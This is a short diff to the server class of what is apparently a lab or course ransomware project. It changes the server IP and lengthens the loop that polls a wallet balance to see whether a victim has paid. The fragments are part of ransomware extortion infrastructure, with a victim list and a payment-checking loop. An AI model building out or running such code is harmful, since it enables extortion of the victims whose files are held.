@@ -23,7 +23,7 @@ class Server:
     """
    
     FORMAT = 'utf-8'
-    IP_ADDR = '10.0.2.15'
+    IP_ADDR = '10.0.2.5'
     MAX_SIZE = 4096
     VICTIMS = []
     WORKING_DIR = '/home/netsec/server'
@@ -207,8 +207,8 @@ class Server:
                             break
                     
                 while (True):
-                    #Every 5 seconds check if victim paid, if they did send them a message
-                    time.sleep(5)
+                    #Every  60 seconds check if victim paid, if they did send them a message
+                    time.sleep(60)
                     # paid = self.check_if_user_paid()
                     initial_balance = self.get_balance(WALLET_ADDRESS)
 
